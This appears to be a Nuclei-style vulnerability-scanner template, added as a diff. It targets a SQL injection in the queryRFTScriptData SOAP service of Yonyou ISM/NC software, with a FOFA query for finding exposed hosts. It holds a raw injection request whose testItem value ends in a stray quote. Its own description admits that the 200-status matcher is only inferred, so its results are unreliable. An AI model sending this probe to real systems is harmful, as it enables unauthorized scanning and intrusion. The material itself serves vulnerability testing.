@@ -1,0 +1,21 @@
+id: poc-1415d682acd985688f4e
+info:
+  name: 用友ismqueryRFTScriptData参数存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1415d682acd985688f4ec0bca3f12aaa
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1415d682acd985688f4ec0bca3f12aaa
+    fofa: + fofa`app="用友-ism"`
+http:
+- raw:
+  - "POST /uapws/service/nc.itf.sdp.web.autotest.IAutoTestWebService HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nCookie: JSESSIONID=CD455D10BBE0F87FB8D6D6CEED880D58.server\nUpgrade-Insecure-Requests: 1\nSOAPAction: urn:queryRFTScriptData\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 739\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:iaut=\"http://autotest.web.sdp.itf.nc/IAutoTestWebService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <iaut:queryRFTScriptData>\n         <queryInfo>\n            <!--type: string-->\n            <testItem>gero et'</testItem>\n\n            <!--type: string-->\n            <moduleName>sonoras imperio</moduleName>\n\n            <!--type: string-->\n            <versionCode>quae divum incedo</versionCode>\n\n            <!--type: string-->\n            <devfield>verrantque per auras</devfield>\n\n            <!--type: string-->\n            <testerCode>per auras</testerCode>\n\n         </queryInfo>\n\n      </iaut:queryRFTScriptData>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
